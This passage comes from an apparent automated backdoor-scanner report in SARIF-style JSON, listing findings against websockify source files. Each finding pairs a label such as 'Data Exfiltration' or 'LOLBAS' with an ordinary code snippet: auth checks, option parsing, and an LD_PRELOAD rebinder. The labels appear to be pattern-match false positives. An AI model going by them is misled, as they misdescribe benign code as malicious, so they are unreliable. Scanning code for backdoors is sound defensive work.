                      "text": "        window.onload = function() {\n            console.log(\"onload\");\n            var url = document.location.href;\n            document.getElementById('host').value = (url.match(/host=([^&#]*)/) || ['',window.location.hostname])[1];\n            document.getElementById('port').value = (url.match(/port=([^&#]*)/) || ['',window.location.port])[1];\n            document.getElementById('payload_size').value = payload_size;\n        }\n",
                      "markdown": "`        window.onload = function() {\n            console.log(\"onload\");\n            var url = document.location.href;\n            document.getElementById('host').value = (url.match(/host=([^&#]*)/) || ['',window.location.hostname])[1];\n            document.getElementById('port').value = (url.match(/port=([^&#]*)/) || ['',window.location.port])[1];\n            document.getElementById('payload_size').value = payload_size;\n        }\n`"
                    }
                  },
                  "sourceLanguage": "html"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/auth_plugins.py"
                },
                "region": {
                  "startLine": 39,
                  "startColumn": 14,
                  "endLine": 40,
                  "snippet": {
                    "text": "        self.src = src\n\n    def authenticate(self, headers, target_host, target_port):\n        import base64\n        auth_header = headers.get('Authorization')\n        if auth_header:\n            if not auth_header.startswith('Basic '):\n                self.auth_error()\n",
                    "rendered": {
                      "text": "        self.src = src\n\n    def authenticate(self, headers, target_host, target_port):\n        import base64\n        auth_header = headers.get('Authorization')\n        if auth_header:\n            if not auth_header.startswith('Basic '):\n                self.auth_error()\n",
                      "markdown": "`        self.src = src\n\n    def authenticate(self, headers, target_host, target_port):\n        import base64\n        auth_header = headers.get('Authorization')\n        if auth_header:\n            if not auth_header.startswith('Basic '):\n                self.auth_error()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/auth_plugins.py"
                },
                "region": {
                  "startLine": 46,
                  "startColumn": 32,
                  "endLine": 46,
                  "endColumn": 38,
                  "snippet": {
                    "text": "                self.auth_error()\n\n            try:\n                user_pass_raw = base64.b64decode(auth_header[6:])\n            except TypeError:\n                self.auth_error()\n\n",
                    "rendered": {
                      "text": "                self.auth_error()\n\n            try:\n                user_pass_raw = base64.b64decode(auth_header[6:])\n            except TypeError:\n                self.auth_error()\n\n",
                      "markdown": "`                self.auth_error()\n\n            try:\n                user_pass_raw = base64.b64decode(auth_header[6:])\n            except TypeError:\n                self.auth_error()\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/auth_plugins.py"
                },
                "region": {
                  "startLine": 39,
                  "startColumn": 15,
                  "endLine": 39,
                  "endColumn": 21,
                  "snippet": {
                    "text": "        self.src = src\n\n    def authenticate(self, headers, target_host, target_port):\n        import base64\n        auth_header = headers.get('Authorization')\n        if auth_header:\n            if not auth_header.startswith('Basic '):\n",
                    "rendered": {
                      "text": "        self.src = src\n\n    def authenticate(self, headers, target_host, target_port):\n        import base64\n        auth_header = headers.get('Authorization')\n        if auth_header:\n            if not auth_header.startswith('Basic '):\n",
                      "markdown": "`        self.src = src\n\n    def authenticate(self, headers, target_host, target_port):\n        import base64\n        auth_header = headers.get('Authorization')\n        if auth_header:\n            if not auth_header.startswith('Basic '):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/auth_plugins.py"
                },
                "region": {
                  "startLine": 101,
                  "startColumn": 18,
                  "endLine": 101,
                  "endColumn": 23,
                  "snippet": {
                    "text": "            self.source = src.split()\n\n    def authenticate(self, headers, target_host, target_port):\n        if headers.get('SSL_CLIENT_S_DN_CN', None) not in self.source:\n            raise AuthenticationError(response_code=403)\n",
                    "rendered": {
                      "text": "            self.source = src.split()\n\n    def authenticate(self, headers, target_host, target_port):\n        if headers.get('SSL_CLIENT_S_DN_CN', None) not in self.source:\n            raise AuthenticationError(response_code=403)\n",
                      "markdown": "`            self.source = src.split()\n\n    def authenticate(self, headers, target_host, target_port):\n        if headers.get('SSL_CLIENT_S_DN_CN', None) not in self.source:\n            raise AuthenticationError(response_code=403)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/auth_plugins.py"
                },
                "region": {
                  "startLine": 87,
                  "startColumn": 24,
                  "endLine": 87,
                  "endColumn": 29,
                  "snippet": {
                    "text": "            self.source = src.split()\n\n    def authenticate(self, headers, target_host, target_port):\n        origin = headers.get('Origin', None)\n        if origin is None or origin not in self.source:\n            raise InvalidOriginError(expected=self.source, actual=origin)\n\n",
                    "rendered": {
                      "text": "            self.source = src.split()\n\n    def authenticate(self, headers, target_host, target_port):\n        origin = headers.get('Origin', None)\n        if origin is None or origin not in self.source:\n            raise InvalidOriginError(expected=self.source, actual=origin)\n\n",
                      "markdown": "`            self.source = src.split()\n\n    def authenticate(self, headers, target_host, target_port):\n        origin = headers.get('Origin', None)\n        if origin is None or origin not in self.source:\n            raise InvalidOriginError(expected=self.source, actual=origin)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/auth_plugins.py"
                },
                "region": {
                  "startLine": 40,
                  "startColumn": 29,
                  "endLine": 40,
                  "endColumn": 34,
                  "snippet": {
                    "text": "\n    def authenticate(self, headers, target_host, target_port):\n        import base64\n        auth_header = headers.get('Authorization')\n        if auth_header:\n            if not auth_header.startswith('Basic '):\n                self.auth_error()\n",
                    "rendered": {
                      "text": "\n    def authenticate(self, headers, target_host, target_port):\n        import base64\n        auth_header = headers.get('Authorization')\n        if auth_header:\n            if not auth_header.startswith('Basic '):\n                self.auth_error()\n",
                      "markdown": "`\n    def authenticate(self, headers, target_host, target_port):\n        import base64\n        auth_header = headers.get('Authorization')\n        if auth_header:\n            if not auth_header.startswith('Basic '):\n                self.auth_error()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/auth_plugins.py"
                },
                "region": {
                  "startLine": 67,
                  "startColumn": 32,
                  "endLine": 67,
                  "endColumn": 40,
                  "snippet": {
                    "text": "            self.demand_auth()\n\n    def validate_creds(self, username, password):\n        if '%s:%s' % (username, password) == self.src:\n            return True\n        else:\n            return False\n",
                    "rendered": {
                      "text": "            self.demand_auth()\n\n    def validate_creds(self, username, password):\n        if '%s:%s' % (username, password) == self.src:\n            return True\n        else:\n            return False\n",
                      "markdown": "`            self.demand_auth()\n\n    def validate_creds(self, username, password):\n        if '%s:%s' % (username, password) == self.src:\n            return True\n        else:\n            return False\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/auth_plugins.py"
                },
                "region": {
                  "startLine": 66,
                  "startColumn": 39,
                  "endLine": 66,
                  "endColumn": 47,
                  "snippet": {
                    "text": "        else:\n            self.demand_auth()\n\n    def validate_creds(self, username, password):\n        if '%s:%s' % (username, password) == self.src:\n            return True\n        else:\n",
                    "rendered": {
                      "text": "        else:\n            self.demand_auth()\n\n    def validate_creds(self, username, password):\n        if '%s:%s' % (username, password) == self.src:\n            return True\n        else:\n",
                      "markdown": "`        else:\n            self.demand_auth()\n\n    def validate_creds(self, username, password):\n        if '%s:%s' % (username, password) == self.src:\n            return True\n        else:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/auth_plugins.py"
                },
                "region": {
                  "startLine": 33,
                  "startColumn": 60,
                  "endLine": 33,
                  "endColumn": 68,
                  "snippet": {
                    "text": "\n\nclass BasicHTTPAuth():\n    \"\"\"Verifies Basic Auth headers. Specify src as username:password\"\"\"\n\n    def __init__(self, src=None):\n        self.src = src\n",
                    "rendered": {
                      "text": "\n\nclass BasicHTTPAuth():\n    \"\"\"Verifies Basic Auth headers. Specify src as username:password\"\"\"\n\n    def __init__(self, src=None):\n        self.src = src\n",
                      "markdown": "`\n\nclass BasicHTTPAuth():\n    \"\"\"Verifies Basic Auth headers. Specify src as username:password\"\"\"\n\n    def __init__(self, src=None):\n        self.src = src\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websocketproxy.py"
                },
                "region": {
                  "startLine": 330,
                  "startColumn": 29,
                  "endLine": 330,
                  "endColumn": 33,
                  "snippet": {
                    "text": "            self.target_port = sock.getsockname()[1]\n            sock.close()\n\n            # Insert rebinder at the head of the (possibly empty) LD_PRELOAD pathlist\n            ld_preloads = filter(None, [ self.rebinder, os.environ.get(\"LD_PRELOAD\", None) ])\n\n            os.environ.update({\n",
                    "rendered": {
                      "text": "            self.target_port = sock.getsockname()[1]\n            sock.close()\n\n            # Insert rebinder at the head of the (possibly empty) LD_PRELOAD pathlist\n            ld_preloads = filter(None, [ self.rebinder, os.environ.get(\"LD_PRELOAD\", None) ])\n\n            os.environ.update({\n",
                      "markdown": "`            self.target_port = sock.getsockname()[1]\n            sock.close()\n\n            # Insert rebinder at the head of the (possibly empty) LD_PRELOAD pathlist\n            ld_preloads = filter(None, [ self.rebinder, os.environ.get(\"LD_PRELOAD\", None) ])\n\n            os.environ.update({\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websocketproxy.py"
                },
                "region": {
                  "startLine": 743,
                  "startColumn": 22,
                  "endLine": 743,
                  "endColumn": 31,
                  "snippet": {
                    "text": "        server = LibProxyServer(**opts.__dict__)\n        server.serve_forever()\n    else:\n        # Use internal service framework\n        server = WebSocketProxy(**opts.__dict__)\n        server.start_server()\n\n",
                    "rendered": {
                      "text": "        server = LibProxyServer(**opts.__dict__)\n        server.serve_forever()\n    else:\n        # Use internal service framework\n        server = WebSocketProxy(**opts.__dict__)\n        server.start_server()\n\n",
                      "markdown": "`        server = LibProxyServer(**opts.__dict__)\n        server.serve_forever()\n    else:\n        # Use internal service framework\n        server = WebSocketProxy(**opts.__dict__)\n        server.start_server()\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websocketproxy.py"
                },
                "region": {
                  "startLine": 475,
                  "startColumn": 36,
                  "endLine": 475,
                  "endColumn": 45,
                  "snippet": {
                    "text": "    parser.add_option(\"--timeout\", type=int, default=0,\n            help=\"after TIMEOUT seconds exit when not connected\")\n    parser.add_option(\"--idle-timeout\", type=int, default=0,\n            help=\"server exits after TIMEOUT seconds if there are no \"\n                 \"active connections\")\n    parser.add_option(\"--cert\", default=\"self.pem\",\n            help=\"SSL certificate file\")\n",
                    "rendered": {
                      "text": "    parser.add_option(\"--timeout\", type=int, default=0,\n            help=\"after TIMEOUT seconds exit when not connected\")\n    parser.add_option(\"--idle-timeout\", type=int, default=0,\n            help=\"server exits after TIMEOUT seconds if there are no \"\n                 \"active connections\")\n    parser.add_option(\"--cert\", default=\"self.pem\",\n            help=\"SSL certificate file\")\n",
                      "markdown": "`    parser.add_option(\"--timeout\", type=int, default=0,\n            help=\"after TIMEOUT seconds exit when not connected\")\n    parser.add_option(\"--idle-timeout\", type=int, default=0,\n            help=\"server exits after TIMEOUT seconds if there are no \"\n                 \"active connections\")\n    parser.add_option(\"--cert\", default=\"self.pem\",\n            help=\"SSL certificate file\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websocketproxy.py"
                },
                "region": {
                  "startLine": 473,
                  "startColumn": 23,
                  "endLine": 473,
                  "endColumn": 32,
                  "snippet": {
                    "text": "    parser.add_option(\"--run-once\", action=\"store_true\",\n            help=\"handle a single WebSocket connection and exit\")\n    parser.add_option(\"--timeout\", type=int, default=0,\n            help=\"after TIMEOUT seconds exit when not connected\")\n    parser.add_option(\"--idle-timeout\", type=int, default=0,\n            help=\"server exits after TIMEOUT seconds if there are no \"\n                 \"active connections\")\n",
                    "rendered": {
                      "text": "    parser.add_option(\"--run-once\", action=\"store_true\",\n            help=\"handle a single WebSocket connection and exit\")\n    parser.add_option(\"--timeout\", type=int, default=0,\n            help=\"after TIMEOUT seconds exit when not connected\")\n    parser.add_option(\"--idle-timeout\", type=int, default=0,\n            help=\"server exits after TIMEOUT seconds if there are no \"\n                 \"active connections\")\n",
                      "markdown": "`    parser.add_option(\"--run-once\", action=\"store_true\",\n            help=\"handle a single WebSocket connection and exit\")\n    parser.add_option(\"--timeout\", type=int, default=0,\n            help=\"after TIMEOUT seconds exit when not connected\")\n    parser.add_option(\"--idle-timeout\", type=int, default=0,\n            help=\"server exits after TIMEOUT seconds if there are no \"\n                 \"active connections\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websocketproxy.py"
                },
                "region": {
                  "startLine": 330,
                  "startColumn": 36,
                  "endLine": 330,
                  "endColumn": 42,
                  "snippet": {
                    "text": "            self.target_port = sock.getsockname()[1]\n            sock.close()\n\n            # Insert rebinder at the head of the (possibly empty) LD_PRELOAD pathlist\n            ld_preloads = filter(None, [ self.rebinder, os.environ.get(\"LD_PRELOAD\", None) ])\n\n            os.environ.update({\n",
                    "rendered": {
                      "text": "            self.target_port = sock.getsockname()[1]\n            sock.close()\n\n            # Insert rebinder at the head of the (possibly empty) LD_PRELOAD pathlist\n            ld_preloads = filter(None, [ self.rebinder, os.environ.get(\"LD_PRELOAD\", None) ])\n\n            os.environ.update({\n",
                      "markdown": "`            self.target_port = sock.getsockname()[1]\n            sock.close()\n\n            # Insert rebinder at the head of the (possibly empty) LD_PRELOAD pathlist\n            ld_preloads = filter(None, [ self.rebinder, os.environ.get(\"LD_PRELOAD\", None) ])\n\n            os.environ.update({\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websocketproxy.py"
                },
                "region": {
                  "startLine": 324,
                  "startColumn": 13,
                  "endLine": 324,
                  "endColumn": 19,
                  "snippet": {
                    "text": "            self.rebinder = os.path.abspath(self.rebinder)\n\n            self.target_host = \"127.0.0.1\"  # Loopback\n            # Find a free high port\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.bind(('', 0))\n            self.target_port = sock.getsockname()[1]\n",
                    "rendered": {
                      "text": "            self.rebinder = os.path.abspath(self.rebinder)\n\n            self.target_host = \"127.0.0.1\"  # Loopback\n            # Find a free high port\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.bind(('', 0))\n            self.target_port = sock.getsockname()[1]\n",
                      "markdown": "`            self.rebinder = os.path.abspath(self.rebinder)\n\n            self.target_host = \"127.0.0.1\"  # Loopback\n            # Find a free high port\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.bind(('', 0))\n            self.target_port = sock.getsockname()[1]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websocketproxy.py"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 43,
                  "endLine": 9,
                  "endColumn": 8,
                  "snippet": {
                    "text": "Copyright 2011 Joel Martin\nLicensed under LGPL version 3 (see docs/LICENSE.LGPL-3)\n\nYou can make a cert/key with openssl using:\nopenssl req -new -x509 -days 365 -nodes -out self.pem -keyout self.pem\nas taken from http://docs.python.org/dev/library/ssl.html#certificates\n\n'''\n",
                    "rendered": {
                      "text": "Copyright 2011 Joel Martin\nLicensed under LGPL version 3 (see docs/LICENSE.LGPL-3)\n\nYou can make a cert/key with openssl using:\nopenssl req -new -x509 -days 365 -nodes -out self.pem -keyout self.pem\nas taken from http://docs.python.org/dev/library/ssl.html#certificates\n\n'''\n",
                      "markdown": "`Copyright 2011 Joel Martin\nLicensed under LGPL version 3 (see docs/LICENSE.LGPL-3)\n\nYou can make a cert/key with openssl using:\nopenssl req -new -x509 -days 365 -nodes -out self.pem -keyout self.pem\nas taken from http://docs.python.org/dev/library/ssl.html#certificates\n\n'''\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websocketproxy.py"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 28,
                  "endLine": 8,
                  "endColumn": 37,
                  "snippet": {
                    "text": "Copyright 2011 Joel Martin\nLicensed under LGPL version 3 (see docs/LICENSE.LGPL-3)\n\nYou can make a cert/key with openssl using:\nopenssl req -new -x509 -days 365 -nodes -out self.pem -keyout self.pem\nas taken from http://docs.python.org/dev/library/ssl.html#certificates\n\n",
                    "rendered": {
                      "text": "Copyright 2011 Joel Martin\nLicensed under LGPL version 3 (see docs/LICENSE.LGPL-3)\n\nYou can make a cert/key with openssl using:\nopenssl req -new -x509 -days 365 -nodes -out self.pem -keyout self.pem\nas taken from http://docs.python.org/dev/library/ssl.html#certificates\n\n",
                      "markdown": "`Copyright 2011 Joel Martin\nLicensed under LGPL version 3 (see docs/LICENSE.LGPL-3)\n\nYou can make a cert/key with openssl using:\nopenssl req -new -x509 -days 365 -nodes -out self.pem -keyout self.pem\nas taken from http://docs.python.org/dev/library/ssl.html#certificates\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websocketproxy.py"
                },
                "region": {
                  "startLine": 331,
                  "startColumn": 66,
                  "endLine": 331,
                  "endColumn": 71,
                  "snippet": {
                    "text": "            sock.close()\n\n            # Insert rebinder at the head of the (possibly empty) LD_PRELOAD pathlist\n            ld_preloads = filter(None, [ self.rebinder, os.environ.get(\"LD_PRELOAD\", None) ])\n\n            os.environ.update({\n                \"LD_PRELOAD\": os.pathsep.join(ld_preloads),\n",
                    "rendered": {
                      "text": "            sock.close()\n\n            # Insert rebinder at the head of the (possibly empty) LD_PRELOAD pathlist\n            ld_preloads = filter(None, [ self.rebinder, os.environ.get(\"LD_PRELOAD\", None) ])\n\n            os.environ.update({\n                \"LD_PRELOAD\": os.pathsep.join(ld_preloads),\n",
                      "markdown": "`            sock.close()\n\n            # Insert rebinder at the head of the (possibly empty) LD_PRELOAD pathlist\n            ld_preloads = filter(None, [ self.rebinder, os.environ.get(\"LD_PRELOAD\", None) ])\n\n            os.environ.update({\n                \"LD_PRELOAD\": os.pathsep.join(ld_preloads),\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websocketproxy.py"
                },
                "region": {
                  "startLine": 146,
                  "startColumn": 32,
                  "endLine": 146,
                  "endColumn": 37,
                  "snippet": {
                    "text": "\n        if self.host_token:\n            # Use hostname as token\n            token = self.headers.get('Host')\n\n            # Remove port from hostname, as it'll always be the one where\n            # websockify listens (unless something between the client and\n",
                    "rendered": {
                      "text": "\n        if self.host_token:\n            # Use hostname as token\n            token = self.headers.get('Host')\n\n            # Remove port from hostname, as it'll always be the one where\n            # websockify listens (unless something between the client and\n",
                      "markdown": "`\n        if self.host_token:\n            # Use hostname as token\n            token = self.headers.get('Host')\n\n            # Remove port from hostname, as it'll always be the one where\n            # websockify listens (unless something between the client and\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websocketproxy.py"
                },
                "region": {
                  "startLine": 482,
                  "startColumn": 26,
                  "endLine": 482,
                  "endColumn": 34,
                  "snippet": {
                    "text": "    parser.add_option(\"--key\", default=None,\n            help=\"SSL key file (if separate from cert)\")\n    parser.add_option(\"--key-password\", default=None,\n            help=\"SSL key password\")\n    parser.add_option(\"--ssl-only\", action=\"store_true\",\n            help=\"disallow non-encrypted client connections\")\n    parser.add_option(\"--ssl-target\", action=\"store_true\",\n",
                    "rendered": {
                      "text": "    parser.add_option(\"--key\", default=None,\n            help=\"SSL key file (if separate from cert)\")\n    parser.add_option(\"--key-password\", default=None,\n            help=\"SSL key password\")\n    parser.add_option(\"--ssl-only\", action=\"store_true\",\n            help=\"disallow non-encrypted client connections\")\n    parser.add_option(\"--ssl-target\", action=\"store_true\",\n",
                      "markdown": "`    parser.add_option(\"--key\", default=None,\n            help=\"SSL key file (if separate from cert)\")\n    parser.add_option(\"--key-password\", default=None,\n            help=\"SSL key password\")\n    parser.add_option(\"--ssl-only\", action=\"store_true\",\n            help=\"disallow non-encrypted client connections\")\n    parser.add_option(\"--ssl-target\", action=\"store_true\",\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websocketproxy.py"
                },
                "region": {
                  "startLine": 481,
                  "startColumn": 29,
                  "endLine": 481,
                  "endColumn": 37,
                  "snippet": {
                    "text": "            help=\"SSL certificate file\")\n    parser.add_option(\"--key\", default=None,\n            help=\"SSL key file (if separate from cert)\")\n    parser.add_option(\"--key-password\", default=None,\n            help=\"SSL key password\")\n    parser.add_option(\"--ssl-only\", action=\"store_true\",\n            help=\"disallow non-encrypted client connections\")\n",
                    "rendered": {
                      "text": "            help=\"SSL certificate file\")\n    parser.add_option(\"--key\", default=None,\n            help=\"SSL key file (if separate from cert)\")\n    parser.add_option(\"--key-password\", default=None,\n            help=\"SSL key password\")\n    parser.add_option(\"--ssl-only\", action=\"store_true\",\n            help=\"disallow non-encrypted client connections\")\n",
                      "markdown": "`            help=\"SSL certificate file\")\n    parser.add_option(\"--key\", default=None,\n            help=\"SSL key file (if separate from cert)\")\n    parser.add_option(\"--key-password\", default=None,\n            help=\"SSL key password\")\n    parser.add_option(\"--ssl-only\", action=\"store_true\",\n            help=\"disallow non-encrypted client connections\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/websockify/websocketproxy.py"
                },
                "region": {
                  "startLine": 331,
                  "startColumn": 59,
                  "endLine": 331,
                  "endColumn": 70,
                  "snippet": {
                    "text": "            sock.close()\n\n            # Insert rebinder at the head of the (possibly empty) LD_PRELOAD pathlist\n            ld_preloads = filter(None, [ self.rebinder, os.environ.get(\"LD_PRELOAD\", None) ])\n\n            os.environ.update({\n                \"LD_PRELOAD\": os.pathsep.join(ld_preloads),\n",
                    "rendered": {
                      "text": "            sock.close()\n\n            # Insert rebinder at the head of the (possibly empty) LD_PRELOAD pathlist\n            ld_preloads = filter(None, [ self.rebinder, os.environ.get(\"LD_PRELOAD\", None) ])\n\n            os.environ.update({\n                \"LD_PRELOAD\": os.pathsep.join(ld_preloads),\n",
                      "markdown": "`            sock.close()\n\n            # Insert rebinder at the head of the (possibly empty) LD_PRELOAD pathlist\n            ld_preloads = filter(None, [ self.rebinder, os.environ.get(\"LD_PRELOAD\", None) ])\n\n            os.environ.update({\n                \"LD_PRELOAD\": os.pathsep.join(ld_preloads),\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
